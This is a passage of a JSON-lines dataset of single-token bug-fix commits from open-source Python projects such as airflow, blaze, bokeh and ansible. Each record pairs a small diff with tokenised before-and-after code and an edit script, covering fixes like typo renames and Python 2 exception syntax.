"sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:test_tokenizer_handles_double_trainling_ws\", 3, 5, 3, 47], \"test_tokenizer_handles_double_trailing_ws\"]]"}
{"project": "airflow", "commit_sha": "f0460ccb312466bda616bdcd835fcf07552998dc", "parent_sha": "6ae5f2b69a85346bc82c35b1e930dd4469436b9e", "file_path": "airflow/models/crypto.py", "project_url": "https://github.com/costrouc/airflow", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -39,7 +39,7 @@ class NullFernet:\n     is_encrypted = False\n \n-    def decrpyt(self, b):\n+    def decrypt(self, b):\n         return b\n \n     def encrypt(self, b):\n", "before": "def decrpyt ( self , b ) : return b", "after": "def decrypt ( self , b ) : return b", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:decrpyt\", 2, 9, 2, 16], \"decrypt\"]]"}
{"project": "blaze", "commit_sha": "592751093f117c5f82d5746498c0a6f22e464f88", "parent_sha": "fcf765d6a5423341c331be67ef78a1bfe714aade", "file_path": "blaze/compute/tests/test_pandas.py", "project_url": "https://github.com/TomAugspurger/blaze", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -111,7 +111,7 @@ def test_by_three():\n \n     assert str(result) == str(expected)\n \n-def test_by_three():\n+def test_by_four():\n     t = tbig[['sex', 'amount']]\n     result = compute(By(t, t['sex'], t['amount'].max()), dfbig)\n \n", "before": "def test_by_three ( ) : t = tbig [ [ 'sex' , 'amount' ] ] result = compute ( By ( t , t [ 'sex' ] , t [ 'amount' ] . max ( ) ) , dfbig )", "after": "def test_by_four ( ) : t = tbig [ [ 'sex' , 'amount' ] ] result = compute ( By ( t , t [ 'sex' ] , t [ 'amount' ] . max ( ) ) , dfbig )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:test_by_three\", 3, 5, 3, 18], \"test_by_four\"]]"}
{"project": "blaze", "commit_sha": "33f0e717b3351fb957fd4a5f16ef1734d4595eab", "parent_sha": "ae120a9f513a40f3fc5ed522751dd7fd52802bc8", "file_path": "blaze/expr/scalar/numbers.py", "project_url": "https://github.com/TomAugspurger/blaze", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -47,7 +47,7 @@ class NumberInterface(Scalar):\n     def __rdiv__(self, other):\n         return Div(other, self)\n \n-    def __sub_(self, other):\n+    def __sub__(self, other):\n         return Sub(self, other)\n \n     def __rsub__(self, other):\n", "before": "def __sub_ ( self , other ) : return Sub ( self , other )", "after": "def __sub__ ( self , other ) : return Sub ( self , other )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:__sub_\", 3, 9, 3, 15], \"__sub__\"]]"}
{"project": "blaze", "commit_sha": "07d6d54047ed0c4b805a63fbdbe5fde2df9945d2", "parent_sha": "f636c161909880271a736ad3b123303e065cd38e", "file_path": "blaze/io/sql/air.py", "project_url": "https://github.com/TomAugspurger/blaze", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -116,7 +116,7 @@ def sql_to_pykernel(expr, op, env):\n         try:\n             # print(\"executing...\", select_query)\n             result = execute(conn, dshape, select_query, [])\n-        except db.OperationalError, e:\n+        except db.OperationalError as e:\n             raise db.OperationalError(\n                 \"Error executing %s: %s\" % (select_query, e))\n \n", "before": "try : result = execute ( conn , dshape , select_query , [ ] ) except db . OperationalError , e : raise db . OperationalError ( \"Error executing %s: %s\" % ( select_query , e ) )", "after": "try : result = execute ( conn , dshape , select_query , [ ] ) except db . OperationalError as e : raise db . OperationalError ( \"Error executing %s: %s\" % ( select_query , e ) )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"except_clause\", 3, 9, 5, 62], [\"as:as\", \"T\"], 2], [\"Delete\", [\",:,\", 3, 35, 3, 36]]]"}
{"project": "blaze", "commit_sha": "2dcd65c5ba68c4736e13c99708c92bb3cde3c088", "parent_sha": "72cf7a145599d748372c40323f84f5d80012d1a2", "file_path": "blaze/api/resource.py", "project_url": "https://github.com/TomAugspurger/blaze", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -34,7 +34,7 @@ def resource_csv(uri, **kwargs):\n \n \n @resource.register('.*\\.(csv|data|txt|dat)\\.gz')\n-def resource_csv(uri, **kwargs):\n+def resource_csv_gz(uri, **kwargs):\n     return CSV(uri, open=gzip.open, **kwargs)\n \n \n", "before": "def resource_csv ( uri , ** kwargs ) : return CSV ( uri , open = gzip . open , ** kwargs )", "after": "def resource_csv_gz ( uri , ** kwargs ) : return CSV ( uri , open = gzip . open , ** kwargs )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:resource_csv\", 3, 5, 3, 17], \"resource_csv_gz\"]]"}
{"project": "bokeh", "commit_sha": "eeb3c9e4f330a4b2e5c24dc79f7b3fd9d2d2b325", "parent_sha": "fb67f3c33b16e6c9d5e66b294a74a4dc49831c39", "file_path": "bokeh/webutils.py", "project_url": "https://github.com/TomAugspurger/bokeh", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1,4 +1,4 @@\n-def json(request):\n+def get_json(request):\n     \"\"\"request from requests library handles backwards compatability for\n     requests < 1.0\n     \"\"\"\n", "before": "def json ( request ) : \"\"\"request from requests library handles backwards compatability for\n     requests < 1.0\n     \"\"\"", "after": "def get_json ( request ) : \"\"\"request from requests library handles backwards compatability for\n     requests < 1.0\n     \"\"\"", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:json\", 0, 5, 0, 9], \"get_json\"]]"}
{"project": "bokeh", "commit_sha": "675041b7053c5274d2c3224598b2d20c20259ef6", "parent_sha": "0c8ba88edb77eba3a8bcc17307a2dcb5f4c1e85a", "file_path": "bokeh/plotting.py", "project_url": "https://github.com/TomAugspurger/bokeh", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -177,7 +177,7 @@ def output_server(docname, url=\"default\", **kwargs):\n     print \"Using plot server at\", real_url + \"bokeh;\", \"Docname:\", docname\n \n def output_file(filename, title=\"Bokeh Plot\", autosave=True, js=\"inline\",\n-                css=\"inline\", rootdir=None):\n+                css=\"inline\", rootdir=\".\"):\n", "before": "def output_file ( filename , title = \"Bokeh Plot\" , autosave = True , js = \"inline\" , css = \"inline\" , rootdir = None ) : ", "after": "def output_file ( filename , title = \"Bokeh Plot\" , autosave = True , js = \"inline\" , css = \"inline\" , rootdir = \".\" ) : ", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 31, 3, 43], [\"string:\\\".\\\"\", \"T\"], 2], [\"Delete\", [\"none:None\", 3, 39, 3, 43]]]"}
{"project": "joblib", "commit_sha": "8dec5a0aff09427577828733b2d15c833e422c31", "parent_sha": "47548212e2956f29b0e5a74ddaf3e948e6e1023e", "file_path": "doc/parallel_numpy_fixture.py", "project_url": "https://github.com/TomAugspurger/joblib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -15,5 +15,5 @@ def setup_module(module):\n     setup_autokill(module.__name__)\n \n \n-def teardown_autokill(module):\n+def teardown_module(module):\n     teardown_autokill(module.__name__)\n", "before": "def teardown_autokill ( module ) : teardown_autokill ( module . __name__ )", "after": "def teardown_module ( module ) : teardown_autokill ( module . __name__ )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:teardown_autokill\", 3, 5, 3, 22], \"teardown_module\"]]"}
{"project": "joblib", "commit_sha": "9f6f14c31f1a4229219017efe9440912613e6a96", "parent_sha": "5c1c9a02ce846d3a2b5e9a8dcb32e76a60a6e8ff", "file_path": "joblib/parallel.py", "project_url": "https://github.com/TomAugspurger/joblib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -279,7 +279,7 @@ class Parallel(Logger):\n-    def __init__(self, n_jobs=None, verbose=0, pre_dispatch='all'):\n+    def __init__(self, n_jobs=1, verbose=0, pre_dispatch='all'):\n         self.verbose = verbose\n         self.n_jobs = n_jobs\n         self.pre_dispatch = pre_dispatch\n", "before": "def __init__ ( self , n_jobs = None , verbose = 0 , pre_dispatch = 'all' ) : self . verbose = verbose self . n_jobs = n_jobs self . pre_dispatch = pre_dispatch", "after": "def __init__ ( self , n_jobs = 1 , verbose = 0 , pre_dispatch = 'all' ) : self . verbose = verbose self . n_jobs = n_jobs self . pre_dispatch = pre_dispatch", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"default_parameter\", 0, 24, 0, 35], [\"integer:1\", \"T\"], 2], [\"Delete\", [\"none:None\", 0, 31, 0, 35]]]"}
{"project": "dask", "commit_sha": "0515fd1859a2581309f457f378be3e24b7dcb262", "parent_sha": "bc9eccb3ccb287dd13bc4940cfef46678290613a", "file_path": "dask/distributed/tests/test_scheduler.py", "project_url": "https://github.com/TomAugspurger/dask", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -71,7 +71,7 @@ def test_status_client():\n \n \n @contextmanager\n-def scheduler_and_workers(n=2, heartbeat=None):\n+def scheduler_and_workers(n=2, heartbeat=5):\n     with scheduler() as s:\n         workers = [Worker(s.address_to_workers, heartbeat=heartbeat) for i in range(n)]\n \n", "before": "def scheduler_and_workers ( n = 2 , heartbeat = None ) : with scheduler ( ) as s : workers = [ Worker ( s . address_to_workers , heartbeat = heartbeat ) for i in range ( n ) ]", "after": "def scheduler_and_workers ( n = 2 , heartbeat = 5 ) : with scheduler ( ) as s : workers = [ Worker ( s . address_to_workers , heartbeat = heartbeat ) for i in range ( n ) ]", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 32, 3, 46], [\"integer:5\", \"T\"], 2], [\"Delete\", [\"none:None\", 3, 42, 3, 46]]]"}
{"project": "unknown-horizons", "commit_sha": "bb923a78afbaad2384abc696ab55e48533fc5fd8", "parent_sha": "4ceb39ceb2f5e59a3daec4a5c35009720e7783e1", "file_path": "tests/gui/test_mainmenu.py", "project_url": "https://github.com/schittom/unknown-horizons", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -31,7 +31,7 @@ from tests.gui import gui_test, TEST_FIXTURES_DIR\n \n \n @gui_test(timeout=60)\n-def test_support(gui):\n+def test_editor(gui):\n \t\"\"\"Test that the map editor shows up.\"\"\"\n \n \tdef func():\n", "before": "def test_support ( gui ) : \"\"\"Test that the map editor shows up.\"\"\" def func ( ) : ", "after": "def test_editor ( gui ) : \"\"\"Test that the map editor shows up.\"\"\" def func ( ) : ", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:test_support\", 3, 5, 3, 17], \"test_editor\"]]"}
{"project": "unknown-horizons", "commit_sha": "c91188c34334d5ba4037449bcd69ae04cddc027c", "parent_sha": "d55bf33581592092d76533e39091ae1d67927c31", "file_path": "horizons/session.py", "project_url": "https://github.com/schittom/unknown-horizons", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -140,7 +140,7 @@ class Session(LivingObject):\n \n \t\tself._old_autosave_interval = None\n \n-\tdef in_world_editor_mode(self):\n+\tdef in_editor_mode(self):\n \t\treturn False\n \n \tdef create_production_finished_icon_manager(self):\n", "before": "def in_world_editor_mode ( self ) : return False", "after": "def in_editor_mode ( self ) : return False", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:in_world_editor_mode\", 3, 6, 3, 26], \"in_editor_mode\"]]"}
{"project": "Zappa", "commit_sha": "70026a7f9d3de52f4794655e5e0ed2c06e763dd8", "parent_sha": "59d2d179ab90094ddec2d05a09282e299802866e", "file_path": "zappa/cli.py", "project_url": "https://github.com/tripliks/Zappa", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -595,7 +595,7 @@ class ZappaCLI(object):\n             try:\n                 function_response = self.zappa.lambda_client.get_function(FunctionName=self.lambda_name)\n             except botocore.exceptions.ClientError as e: # pragma: no cover\n-                click.echo(click.style(\"Function does not exist\", fg=yellow) + \", please \" + click.style(\"deploy\", bold=True) + \"first. Ex:\" + click.style(\"zappa deploy {}.\".format(self.api_stage), bold=True))\n+                click.echo(click.style(\"Function does not exist\", fg=\"yellow\") + \", please \" + click.style(\"deploy\", bold=True) + \"first. Ex:\" + click.style(\"zappa deploy {}.\".format(self.api_stage), bold=True))\n                 sys.exit(-1)\n \n             print(\"Scheduling..\")\n", "before": "click . echo ( click . style ( \"Function does not exist\" , fg = yellow ) + \", please \" + click . style ( \"deploy\" , bold = True ) + \"first. Ex:\" + click . style ( \"zappa deploy {}.\" . format ( self . api_stage ) , bold = True ) )", "after": "click . echo ( click . style ( \"Function does not exist\" , fg = \"yellow\" ) + \", please \" + click . style ( \"deploy\" , bold = True ) + \"first. Ex:\" + click . style ( \"zappa deploy {}.\" . format ( self . api_stage ) , bold = True ) )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 67, 3, 76], [\"string:\\\"yellow\\\"\", \"T\"], 2], [\"Delete\", [\"identifier:yellow\", 3, 70, 3, 76]]]"}
{"project": "sync_app", "commit_sha": "3a22d01dcaa9fc18d365bf80281ea2ef2a787df2", "parent_sha": "3868a78d46ad56155597c9aa49cfb79bf47fe016", "file_path": "tests/sync_app_unittests_s3.py", "project_url": "https://github.com/ddboline/sync_app", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -47,7 +47,7 @@ class TestSyncAppS3(unittest.TestCase):\n         self.assertEqual(md5_, '8ddd8be4b179a529afa5f2ffae4b9858')\n         self.s3.download(bname, TEST_FILE, 'tests/test_dir/test.txt')\n         self.s3.delete_key(bname, TEST_FILE)\n-        self.s3.delete_bucket('test_bucket_ddbline_20150521')\n+        self.s3.delete_bucket(bname)\n         md5_ = get_md5('tests/test_dir/test.txt')\n         self.assertEqual(md5_, '8ddd8be4b179a529afa5f2ffae4b9858')\n         os.remove('tests/test_dir/test.txt')\n", "before": "self . s3 . delete_bucket ( 'test_bucket_ddbline_20150521' )", "after": "self . s3 . delete_bucket ( bname )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 30, 3, 62], [\"identifier:bname\", \"T\"], 1], [\"Delete\", [\"string:'test_bucket_ddbline_20150521'\", 3, 31, 3, 61]]]"}
{"project": "descqa", "commit_sha": "90acc0ec25acc526ea63c0d7e50f39e6ed554cdd", "parent_sha": "389677e85e2110a140168f2d2ae3933acddb82bb", "file_path": "descqa/apparent_mag_func_test.py", "project_url": "https://github.com/vvinuv/descqa", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -11,7 +11,7 @@ class ApparentMagFuncTest(BaseValidationTest):\n     \"\"\"\n     apparent magnitude function test\n     \"\"\"\n-    def __init__(self, band='i', band_lim=27, observation=none, **kwargs):\n+    def __init__(self, band='i', band_lim=27, observation=None, **kwargs):\n", "before": "def __init__ ( self , band = 'i' , band_lim = 27 , observation = none , ** kwargs ) : ", "after": "def __init__ ( self , band = 'i' , band_lim = 27 , observation = None , ** kwargs ) : ", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 47, 3, 63], [\"none:None\", \"T\"], 2], [\"Delete\", [\"identifier:none\", 3, 59, 3, 63]]]"}
{"project": "descqa", "commit_sha": "9ff0c121d0b848b664f5a84522d2328fd2d5d263", "parent_sha": "855ae22321e637f38e7d7721c8f437bc1f30d4f2", "file_path": "descqa/apparent_mag_func_test.py", "project_url": "https://github.com/vvinuv/descqa", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -11,7 +11,7 @@ class ApparentMagFuncTest(BaseValidationTest):\n     \"\"\"\n     apparent magnitude function test\n     \"\"\"\n-    def __init__(self, band='i', band_lim=27, observation=none, **kwargs):\n+    def __init__(self, band='i', band_lim=27, observation=None, **kwargs):\n", "before": "def __init__ ( self , band = 'i' , band_lim = 27 , observation = none , ** kwargs ) : ", "after": "def __init__ ( self , band = 'i' , band_lim = 27 , observation = None , ** kwargs ) : ", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 47, 3, 63], [\"none:None\", \"T\"], 2], [\"Delete\", [\"identifier:none\", 3, 59, 3, 63]]]"}
{"project": "autotest-", "commit_sha": "7eadbfbc4d53ff8aba5a8816309281fb6724f54d", "parent_sha": "ba74dc0a04033523e245f18c9f79d43de418c594", "file_path": "client/tests/dbench/dbench.py", "project_url": "https://github.com/bobby0809/autotest-", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -15,7 +15,7 @@ class dbench(test.test):\n         utils.system('make')\n \n \n-    def intialize(self):\n+    def initialize(self):\n         self.results = []\n \n \n", "before": "def intialize ( self ) : self . results = [ ]", "after": "def initialize ( self ) : self . results = [ ]", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:intialize\", 3, 9, 3, 18], \"initialize\"]]"}
{"project": "autotest-", "commit_sha": "1481e45277064720a89d6c2f3176be61876d3345", "parent_sha": "e60821c18a9f53822bdc20378ca0d70be6e1534e", "file_path": "client/common_lib/hosts/base_classes.py", "project_url": "https://github.com/bobby0809/autotest-", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -654,7 +654,7 @@ class Host(object):\n         # find all the vmlinuz images referenced by the bootloader\n         vmlinuz_prefix = os.path.join(boot_dir, 'vmlinuz-')\n         boot_info = self.bootloader.get_entries()\n-        used_kernver = [boot['kernel'][len(vmlinuz_prefix):]\n+        used_kernver = [boot['kernel'][len('vmlinuz-'):]\n                         for boot in boot_info.itervalues()]\n \n         # find all the unused vmlinuz images in /boot\n", "before": "used_kernver = [ boot [ 'kernel' ] [ len ( vmlinuz_prefix ) : ] for boot in boot_info . itervalues ( ) ]", "after": "used_kernver = [ boot [ 'kernel' ] [ len ( 'vmlinuz-' ) : ] for boot in boot_info . itervalues ( ) ]", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 43, 3, 59], [\"string:'vmlinuz-'\", \"T\"], 1], [\"Delete\", [\"identifier:vmlinuz_prefix\", 3, 44, 3, 58]]]"}
{"project": "autotest-", "commit_sha": "6c8d7f088d7001b692314886b880ee05223f89c1", "parent_sha": "6f62febcbc85e4bfab852fef95e2af9570c88fa7", "file_path": "client/common_lib/utils.py", "project_url": "https://github.com/bobby0809/autotest-", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -761,7 +761,7 @@ class CmdResult(object):\n \n \n-    def __init__(self, command=None, stdout=\"\", stderr=\"\",\n+    def __init__(self, command=\"\", stdout=\"\", stderr=\"\",\n                  exit_status=None, duration=0):\n         self.command = command\n         self.exit_status = exit_status\n", "before": "def __init__ ( self , command = None , stdout = \"\" , stderr = \"\" , exit_status = None , duration = 0 ) : self . command = command self . exit_status = exit_status", "after": "def __init__ ( self , command = \"\" , stdout = \"\" , stderr = \"\" , exit_status = None , duration = 0 ) : self . command = command self . exit_status = exit_status", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"default_parameter\", 2, 24, 2, 36], [\"string:\\\"\\\"\", \"T\"], 2], [\"Delete\", [\"none:None\", 2, 32, 2, 36]]]"}
{"project": "autotest-", "commit_sha": "54997fc81bf47db278a0467bc6dd52b122e8e2c8", "parent_sha": "14d9ee1df51849e9e292f7057f26695b00721ee3", "file_path": "client/bin/job.py", "project_url": "https://github.com/bobby0809/autotest-", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -260,7 +260,7 @@ class job:\n \t\t\tcpus  = container.get('cpus', None)\n \t\t\tif not cpus:    # get old name\n \t\t\t\tcpus  = container.get('cpu', None)\n-\t\t\troot  = container.get('root', None)\n+\t\t\troot  = container.get('root', '')\n \t\t\tself.new_container(mbytes=mbytes, cpus=cpus, \n \t\t\t\t\troot=root, name=cname)\n \t\t\t# We are running in a container now...\n", "before": "root = container . get ( 'root' , None )", "after": "root = container . get ( 'root' , '' )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 25, 3, 39], [\"string:''\", \"T\"], 3], [\"Delete\", [\"none:None\", 3, 34, 3, 38]]]"}
{"project": "View-vc", "commit_sha": "75871948c3745a5a48ede1be1b38616758afb0e2", "parent_sha": "9e8408d7dab74f6054cdd6df31af5987d7b16878", "file_path": "lib/popen.py", "project_url": "https://github.com/bobby0809/View-vc", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -166,7 +166,7 @@ def pipe_cmds(cmds):\n           x, hStdErr = win32popen.MakeSpyPipe(None, 1, (dbgErr,))\n \n         command = win32popen.CommandLine(cmd[0], cmd[1:])\n-        phandle, pid, thandle, tid = win32popen.CreateProcess(command, hStdIn, hStdOut, None)\n+        phandle, pid, thandle, tid = win32popen.CreateProcess(command, hStdIn, hStdOut, hStdErr)\n         if debug.SHOW_CHILD_PROCESSES:\n           debug.Process(command, dbgIn, dbgOut, dbgErr)\n           \n", "before": "phandle , pid , thandle , tid = win32popen . CreateProcess ( command , hStdIn , hStdOut , None )", "after": "phandle , pid , thandle , tid = win32popen . CreateProcess ( command , hStdIn , hStdOut , hStdErr )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 62, 3, 94], [\"identifier:hStdErr\", \"T\"], 7], [\"Delete\", [\"none:None\", 3, 89, 3, 93]]]"}
{"project": "unknown-horizons", "commit_sha": "bc94ded6e97013e793f7b29acc98d277a2be31a7", "parent_sha": "59f88cbf4a050b01db9c81e106c3a280998d0c04", "file_path": "scripts/ticker.py", "project_url": "https://github.com/schittom/unknown-horizons", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -72,7 +72,7 @@ class Ticker():\n         print self.ticklist[self.process+tickoffset]\n         self.ticklist[self.process+tickoffset].add_command(callback, args)\n \n-    def change_tichrate(self, tps):\n+    def change_tickrate(self, tps):\n         \"\"\"Changes the engines ticks per second\n         @var tps: int ticks per second\"\"\"\n         self.tps = tps \n", "before": "def change_tichrate ( self , tps ) : \"\"\"Changes the engines ticks per second\n         @var tps: int ticks per second\"\"\" self . tps = tps", "after": "def change_tickrate ( self , tps ) : \"\"\"Changes the engines ticks per second\n         @var tps: int ticks per second\"\"\" self . tps = tps", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:change_tichrate\", 3, 9, 3, 24], \"change_tickrate\"]]"}
{"project": "sdg-translations", "commit_sha": "398166e020e456f420ba63e70f0c066f33dcb516", "parent_sha": "d8ae17ea22f8cc03cbec59a44d84a80cc9ad4a03", "file_path": "scripts/build_translations.py", "project_url": "https://github.com/open-sdg/sdg-translations", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -61,7 +61,7 @@ def main():\n     # Copy any other public files into the _site folder for Github Pages.\n     src_files = os.listdir('public')\n     for file_name in src_files:\n-        full_file_name = os.path.join(src, file_name)\n+        full_file_name = os.path.join('public', file_name)\n         if (os.path.isfile(full_file_name)):\n             shutil.copy(full_file_name, '_site')\n \n", "before": "full_file_name = os . path . join ( src , file_name )", "after": "full_file_name = os . path . join ( 'public' , file_name )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 38, 3, 54], [\"string:'public'\", \"T\"], 1], [\"Delete\", [\"identifier:src\", 3, 39, 3, 42]]]"}
{"project": "lifelines", "commit_sha": "7eccfe91c0d365a840e6056fde8dcbb3433e85c5", "parent_sha": "d22c2861a8d1846079501b2e6d58096cbfd77d0f", "file_path": "lifelines/estimation.py", "project_url": "https://github.com/christopherahern/lifelines", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -746,7 +746,7 @@ class AalenAdditiveFitter(BaseFitter):\n         Returns the median lifetimes for the individuals.\n         http://stats.stackexchange.com/questions/102986/percentile-loss-functions\n         \"\"\"\n-        return qth_survival_times(0.5, self.predict_survival_function(X))\n+        return qth_survival_times(p, self.predict_survival_function(X))\n \n     def predict_median(self, X):\n         \"\"\"\n", "before": "return qth_survival_times ( 0.5 , self . predict_survival_function ( X ) )", "after": "return qth_survival_times ( p , self . predict_survival_function ( X ) )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 34, 3, 74], [\"identifier:p\", \"T\"], 1], [\"Delete\", [\"float:0.5\", 3, 35, 3, 38]]]"}
{"project": "ansible-1", "commit_sha": "38c5a0067e4e7879bd692c054e7816017d52eb61", "parent_sha": "8472ef95e5ae679c489fc889b7e0fe6a50267820", "file_path": "lib/ansible/modules/extras/cloud/amazon/ec2_vpc_peer.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -343,8 +343,8 @@ def main():\n     state = module.params.get('state').lower()\n     try:\n         region, ec2_url, aws_connect_kwargs = get_aws_connection_info(module, boto3=True)\n-        client = boto3_conn(module, conn_type='client', resource='ec2', region=region, endpoint=ec2_url, **aws_connect_kwargs)       \n-    except botocore.exceptions.NoCredentialsError, e:\n+        client = boto3_conn(module, conn_type='client', resource='ec2', region=region, endpoint=ec2_url, **aws_connect_kwargs)\n+    except botocore.exceptions.NoCredentialsError as e:\n         module.fail_json(msg=\"Can't authorize connection - \"+str(e))\n \n     if state == 'present':\n", "before": "try : region , ec2_url , aws_connect_kwargs = get_aws_connection_info ( module , boto3 = True ) client = boto3_conn ( module , conn_type = 'client' , resource = 'ec2' , region = region , endpoint = ec2_url , ** aws_connect_kwargs ) except botocore . exceptions . NoCredentialsError , e : module . fail_json ( msg = \"Can't authorize connection - \" + str ( e ) )", "after": "try : region , ec2_url , aws_connect_kwargs = get_aws_connection_info ( module , boto3 = True ) client = boto3_conn ( module , conn_type = 'client' , resource = 'ec2' , region = region , endpoint = ec2_url , ** aws_connect_kwargs ) except botocore . exceptions . NoCredentialsError as e : module . fail_json ( msg = \"Can't authorize connection - \" + str ( e ) )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"except_clause\", 4, 5, 5, 69], [\"as:as\", \"T\"], 2], [\"Delete\", [\",:,\", 4, 50, 4, 51]]]"}
{"project": "ansible-1", "commit_sha": "4017be741a259d516d24ce1588cdcc7ddf28ea8b", "parent_sha": "4af6033469ec8a8ecced3f44ed72cb1e8db2fbbd", "file_path": "lib/ansible/modules/extras/cloud/amazon/ec2_vpc_dhcp_options_facts.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -151,12 +151,12 @@ def main():\n     try:\n         region, ec2_url, aws_connect_kwargs = get_aws_connection_info(module, boto3=True)\n         connection = boto3_conn(module, conn_type='client', resource='ec2', region=region, endpoint=ec2_url, **aws_connect_kwargs)\n-    except botocore.exceptions.NoCredentialsError, e:\n+    except botocore.exceptions.NoCredentialsError as e:\n         module.fail_json(msg=\"Can't authorize connection - \"+str(e))\n \n     # call your function here\n     results = list_dhcp_options(connection, module)\n-    \n+\n     module.exit_json(result=results)\n \n # import module snippets\n", "before": "try : region , ec2_url , aws_connect_kwargs = get_aws_connection_info ( module , boto3 = True ) connection = boto3_conn ( module , conn_type = 'client' , resource = 'ec2' , region = region , endpoint = ec2_url , ** aws_connect_kwargs ) except botocore . exceptions . NoCredentialsError , e : module . fail_json ( msg = \"Can't authorize connection - \" + str ( e ) )", "after": "try : region , ec2_url , aws_connect_kwargs = get_aws_connection_info ( module , boto3 = True ) connection = boto3_conn ( module , conn_type = 'client' , resource = 'ec2' , region = region , endpoint = ec2_url , ** aws_connect_kwargs ) except botocore . exceptions . NoCredentialsError as e : module . fail_json ( msg = \"Can't authorize connection - \" + str ( e ) )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"except_clause\", 3, 5, 4, 69], [\"as:as\", \"T\"], 2], [\"Delete\", [\",:,\", 3, 50, 3, 51]]]"}
{"project": "ansible-1", "commit_sha": "034330e52facc685a353c3b8273770e591fd3065", "parent_sha": "d1c3cbbc70098b2ecd247660b78f25c1b5b23c4a", "file_path": "test/units/modules/network/ios/test_ios_config.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -149,7 +149,7 @@ class TestIosConfigModule(unittest.TestCase):\n         commands = ['hostname foo', 'test1', 'test2']\n         self.execute_module(changed=True, commands=commands, sort=False)\n \n-    def test_ios_config_before_after_no_chnage(self):\n+    def test_ios_config_before_after_no_change(self):\n         set_module_args(dict(lines=['hostname router'],\n                              before=['test1', 'test2'],\n                              after=['test3','test4']))\n", "before": "def test_ios_config_before_after_no_chnage ( self ) : set_module_args ( dict ( lines = [ 'hostname router' ] , before = [ 'test1' , 'test2' ] , after = [ 'test3' , 'test4' ] ) )", "after": "def test_ios_config_before_after_no_change ( self ) : set_module_args ( dict ( lines = [ 'hostname router' ] , before = [ 'test1' , 'test2' ] , after = [ 'test3' , 'test4' ] ) )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:test_ios_config_before_after_no_chnage\", 3, 9, 3, 47], \"test_ios_config_before_after_no_change\"]]"}
